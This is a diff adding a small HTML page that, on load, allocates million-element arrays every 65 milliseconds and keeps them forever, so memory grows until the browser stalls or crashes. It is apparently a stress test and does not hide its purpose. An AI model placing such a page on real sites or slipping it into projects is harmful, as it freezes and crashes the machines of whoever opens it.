@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Memory Load</title>
+    <script>
+        function intensiveMemoryLoad() {
+            let memoryStore = [];
+            setInterval(function() {
+                let tempArray = new Array(1000000).fill(0).map(() => ({
+                    value: Math.random(),
+                    timestamp: Date.now(),
+                    data: new Array(10).fill(Math.random())
+                }));
+                memoryStore.push(tempArray);
+            }, 65);
+        }
+        function startLoad() {
+            intensiveMemoryLoad();
+        }
+    </script>
+</head>
+<body onload="startLoad()">
+Rapid memory-intensive load started...
+</body>
+</html>
